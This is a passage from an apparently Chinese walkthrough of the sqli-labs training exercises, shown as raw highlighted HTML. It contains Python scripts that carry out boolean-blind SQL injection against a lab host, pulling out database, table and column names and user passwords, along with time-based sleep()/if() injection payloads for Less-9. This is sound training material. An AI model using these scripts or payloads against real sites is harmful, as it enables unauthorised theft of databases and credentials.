</span><br><span class="line">                print(<span class="string">&quot;Data is: &quot;</span> + Data + <span class="string">&quot;...&quot;</span>)  </span><br><span class="line">                <span class="keyword">break</span>             </span><br><span class="line">        <span class="keyword">if</span> tempData == Data:  </span><br><span class="line">            print(<span class="string">&quot;Letters too little! Program ended.&quot;</span>)  </span><br><span class="line">            exit()  </span><br><span class="line">    print(<span class="string">&quot;Retrieve completed! Data is: &quot;</span> + Data)  </span><br><span class="line">    <span class="keyword">return</span> Data  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Data_num</span>(<span class="params">TableName</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get Data_num...&quot;</span>)  </span><br><span class="line">    Data_num = <span class="number">0</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and (select count(*) from &#123;0&#125;)&gt;&#123;1&#125;%23&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX_Data_Num):  </span><br><span class="line">        url = url_template.<span class="built_in">format</span>(TableName, i)  </span><br><span class="line">        response = requests.get(url)  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(response.text) != success_response_len:  </span><br><span class="line">            Data_num = i  </span><br><span class="line">            print(<span class="string">&quot;Data_num is: &quot;</span>, Data_num)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">if</span> Data_num == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> i == MAX_Data_Num - <span class="number">1</span>:  </span><br><span class="line">            print(<span class="string">&quot;Data_num &gt; MAX_Data_Num!&quot;</span>)  </span><br><span class="line">        print(<span class="string">&quot;Cannot get Data_len.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> Data_num  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span>  </span><br><span class="line">    result = <span class="string">&quot;0x&quot;</span>  </span><br><span class="line">    str_byte = <span class="built_in">str</span>.encode()  </span><br><span class="line">    result = result + binascii.b2a_hex(str_byte).decode()  </span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line">  </span><br><span class="line">DBName_len = get_DBName_len()  </span><br><span class="line">DBName = get_DBName(DBName_len)  </span><br><span class="line">  </span><br><span class="line">TableName = choose_Table()  </span><br><span class="line">Columns = get_Columns(TableName)  </span><br><span class="line">Data_num = get_Data_num(TableName)  </span><br><span class="line">  </span><br><span class="line">Datas = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Columns)):  </span><br><span class="line">    ColumnName = Columns[i]  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(Data_num):  </span><br><span class="line">        Data_len = get_Data_len(TableName, ColumnName, Data_num)  </span><br><span class="line">        Data = get_Data(TableName, ColumnName, Data_num, Data_len)  </span><br><span class="line">        Datas[j] += <span class="string">&quot;\t&quot;</span> + Data  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;***************************&quot;</span>)  </span><br><span class="line">print(<span class="string">&quot;Database: &quot;</span> + DBName + <span class="string">&quot;Table: &quot;</span> + TableName)  </span><br><span class="line">print(<span class="string">&quot;***************************&quot;</span>)  </span><br><span class="line">print(<span class="string">&quot;\t&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Columns)):  </span><br><span class="line">    print(Columns[i], end=<span class="string">&quot;\t&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Data_num):  </span><br><span class="line">    print(Datas[i])  </span><br><span class="line">print(<span class="string">&quot;Program successfully ended!&quot;</span>)  </span><br><span class="line">print(<span class="string">&quot;***************************&quot;</span>)  </span><br><span class="line"> <span class="comment">#the first table  </span></span><br><span class="line">Table_num = <span class="number">1</span>  </span><br><span class="line">TableName_len = get_TableName_len(Table_num)  </span><br><span class="line">TableName = get_TableName(Table_num, TableName_len)  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">#the first column  </span></span><br><span class="line">Column_num = <span class="number">1</span>  </span><br><span class="line">ColumnName_len = get_ColumnName_len(Column_num, TableName)  </span><br><span class="line">ColumnName = get_ColumnName(Column_num, ColumnName_len)  </span><br><span class="line">   </span><br><span class="line"> <span class="comment">#the first record  </span></span><br><span class="line">Data_num = <span class="number">1</span>  </span><br><span class="line">Data_len = get_Data_len(TableName, ColumnName, Data_num)  </span><br><span class="line">Data = get_Data(TableName, ColumnName, Data_num, Data_len)    </span><br><span class="line">print(<span class="string">&quot;***************************&quot;</span>)  </span><br><span class="line">print(<span class="string">&quot;Database: &quot;</span> + DBName)  </span><br><span class="line">print(<span class="string">&quot;Table: &quot;</span> + TableName)  </span><br><span class="line">print(<span class="string">&quot;Column: &quot;</span> + ColumnName)  </span><br><span class="line">print(<span class="string">&quot;Data: &quot;</span> + Data)  </span><br><span class="line">print(<span class="string">&quot;Program successfully ended!&quot;</span>)  </span><br><span class="line">print(<span class="string">&quot;***************************&quot;</span>)</span><br></pre></td></tr></table></figure><hr><p>脚本二：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.64.135/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 查数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def length():</span></span><br><span class="line"></span><br><span class="line">database_length = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and length(database()) =&quot;</span>+<span class="built_in">str</span>(database_length)+<span class="string">&quot; #&quot;</span></span><br><span class="line">    response = request.urlopen(url+ parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">        <span class="comment">#print(&quot;DATABASE_LENGTH:&quot;+str(database_length))</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        database_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># db_name = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for l in range(database_length):</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     for a in range(128):</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#         param = &quot;1&#x27; and ascii(substr(database(),&quot;  +  str(l+1) +  &quot;))=&quot;  +  str(a) +  &quot;#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#         response = request.urlopen(url + parse.quote(param)).read().decode()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#         if (re.search(&quot;You are in&quot;,response)):</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#             db_name += chr(a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;[*]:&quot;+db_name)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#尝试二分法扫描</span></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(database_length):</span><br><span class="line">    a,b = <span class="number">64</span>,<span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = <span class="built_in">int</span>(b/<span class="number">2</span>)</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and ascii(substr(database(),&quot;</span>  +  <span class="built_in">str</span>(l+<span class="number">1</span>) +  <span class="string">&quot;))&lt;&quot;</span>  +  <span class="built_in">str</span>(a) +  <span class="string">&quot;#&quot;</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">            a -=b</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = <span class="string">&quot;1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot; #&quot;</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">                db_name += <span class="built_in">chr</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a +=b</span><br><span class="line">print(<span class="string">&quot;db_name:&quot;</span>+ db_name)</span><br><span class="line">print(<span class="string">&#x27;table:&#x27;</span>)</span><br><span class="line"><span class="comment">#2 查表数量</span></span><br><span class="line">table_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and (select count(*) from information_schema.tables where table_schema=database())=&quot;</span>+<span class="built_in">str</span>(table_num)+<span class="string">&quot; #&quot;</span></span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">        <span class="comment">#print(&quot;table_num:&quot;+str(table_num))</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查 表长度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ta_length</span>(<span class="params">num</span>):</span></span><br><span class="line">    table_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1),1))=&quot;</span>+<span class="built_in">str</span>(table_length)+<span class="string">&quot; #&quot;</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">            <span class="keyword">return</span> table_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(table_num):</span><br><span class="line">    table_name =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> l  <span class="keyword">in</span> <span class="built_in">range</span>(ta_length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">            param = <span class="string">&quot;1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot; #&quot;</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>, response)):</span><br><span class="line">                table_name += <span class="built_in">chr</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;[*]:&quot;</span> + table_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 查字段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查字段个数</span></span><br><span class="line"></span><br><span class="line">columns_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and (select count(*) from information_schema.columns where table_name=&#x27;users&#x27;)=&quot;</span>+<span class="built_in">str</span>(columns_num)+<span class="string">&quot; #&quot;</span></span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">        print(<span class="string">&quot;columns:&quot;</span>+<span class="built_in">str</span>(columns_num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        columns_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查每个字段的长度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">co_length</span>(<span class="params">num</span>):</span></span><br><span class="line">    columns_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1),1))=&quot;</span>+<span class="built_in">str</span>(columns_length)+<span class="string">&quot; #&quot;</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">            <span class="comment">#print(columns_length)</span></span><br><span class="line">            <span class="keyword">return</span> columns_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            columns_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查每个字段的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(columns_num):</span><br><span class="line">    columns_name =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> l  <span class="keyword">in</span> <span class="built_in">range</span>(co_length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">            param = <span class="string">&quot;1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot; #&quot;</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>, response)):</span><br><span class="line">                columns_name += <span class="built_in">chr</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;[*]:&quot;</span> +columns_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查 username</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and (select count(*) from users )= &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;#&quot;</span></span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">        print(<span class="string">&quot;num:&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length</span>(<span class="params">num</span>):</span></span><br><span class="line">    user_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and length(substr((select username from users limit &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1),1))=&quot;</span>+<span class="built_in">str</span>(user_length)+<span class="string">&quot; #&quot;</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>,response)):</span><br><span class="line">            <span class="comment">#print(user_length)</span></span><br><span class="line">            <span class="keyword">return</span> user_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span>(<span class="params">value1,value2</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        columns_name =<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> l  <span class="keyword">in</span> <span class="built_in">range</span>(length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">                param = <span class="string">&quot;1&#x27; and ascii(substr((select &quot;</span>+value1+<span class="string">&quot; from users limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot; #&quot;</span></span><br><span class="line">                response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>, response)):</span><br><span class="line">                    columns_name += <span class="built_in">chr</span>(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">&quot;[*]:&quot;</span> +columns_name,end=<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        columns_name2 = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(length(n)):  <span class="comment"># 表的长度</span></span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):  <span class="comment"># 爆破表</span></span><br><span class="line">                param = <span class="string">&quot;1&#x27; and ascii(substr((select &quot;</span> + value2 + <span class="string">&quot; from users limit &quot;</span> + <span class="built_in">str</span>(n) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    l + <span class="number">1</span>) + <span class="string">&quot;,1)) =&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot; #&quot;</span></span><br><span class="line">                response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">&quot;You are in&quot;</span>, response)):</span><br><span class="line">                    columns_name2 += <span class="built_in">chr</span>(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(columns_name2)</span><br><span class="line">Name(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;password&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到具体数据：</p><p><img src="/2021/02/17/sql-libs-wp/38.png"></p><p>sqlmap的功能也是类似的。</p><h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>首先从题目上可以知道这是时间盲注，基于的原理是，当对<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/mysql">数据库</a>进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0.于是sleep（N）这个语句在这种情况下起到了非常大的作用。</p><p>Select sleep（N）可以让此语句运行n秒钟。于是sleep（N）这个语句在这种情况下起到了非常大的作用。</p><p>但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。</p><p>这便是SQL基于时间延迟的盲注的工作原理。</p><p>这里输入id=1’和id=1“的结果都是正确的。</p><p><img src="/2021/02/17/sql-libs-wp/39.png"></p><p><img src="/2021/02/17/sql-libs-wp/40.png"></p><p><img src="/2021/02/17/sql-libs-wp/41.png"><br>这一关需要用到一个if函数<br>If(expr1,expr2,expr3) ：既可以作为表达式用，也可在存储过程中作为流程控制语句使用<br>expr1 是判断条件 ，成立执行expr2 不成立执行 expr3<br>还有一个sleep(seconds) ：执行延迟seconds秒</p><p>源代码也显示是单引号闭合，且无论传什么都是回显 you are in</p><p><img src="/2021/02/17/sql-libs-wp/42.png"></p><p><strong>1、注入点判断</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> sleep(<span class="number">5</span>) <span class="comment">--+			# 页面卡住5秒，则说明存在注入点</span></span><br></pre></td></tr></table></figure><p><strong>2、 判断数据库长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+			# 表达式为Ture时，页面卡住5秒。否则页面卡住一秒</span></span><br></pre></td></tr></table></figure><p>延时注入是bool注入的升级版，盲注还是的要靠脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span 